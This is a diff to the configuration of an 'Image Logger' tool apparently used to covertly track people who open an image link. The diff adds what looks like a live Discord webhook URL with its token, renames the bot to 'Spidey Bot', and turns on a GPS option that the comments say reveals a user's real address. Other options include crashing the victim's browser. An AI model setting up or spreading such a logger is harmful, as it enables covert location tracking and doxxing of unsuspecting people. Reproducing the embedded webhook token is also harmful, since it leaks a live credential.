@@ -12,19 +12,19 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1231558709306589255/h--Py6Gp5xvrSJYhWiFTA7ZRr5RT-q73tKX67yP9omN81CHCDJ39f0yAAZuECspLNckW",
+    "image": "https://www.google.com/search?client=ms-android-oppo-rev1&sca_esv=5bc86930ad7b2685&sca_upv=1&sxsrf=ACQVn0-3GQSl56bLE0yl2qpYR3-2q0HIMQ:1713697034561&q=blurred+image&uds=AMwkrPtMJ0s_bKmoc0s_ZDLRdUTzGdWhNns-msVpHjpSujk_thgY-AQ1b5aPQOVCmUsrWETBSNBrJI2iShnkDEe-EyZawVQOYJ5E18LfHQUh5q6ECof5vUkZUVD1qJMiiyjPjVBFuU2Wt1RO4aDNV2avFduiX6NEsev69QXiOdcbv5vqfA5an09fbp9RH_N0dnuqQhszuJNxBsCEO4BsLTRRTczb0GmFNN8WQip2Aeb0hGUNXT5p8ZJPaLJ0N80fQkzoZIaD0N7Vgp55QcNwxaKg5r8PjAvuJp6cTqUdL45Xc4oanXNtbPRdnQdNqd91iYQj_mGitoz2&udm=2&prmd=insvbmtz&sa=X&ved=2ahUKEwjj-Pz3ktOFAxXoSGwGHRbXDwIQtKgLegQIERAB&biw=360&bih=947&dpr=3", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Spidey Bot", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
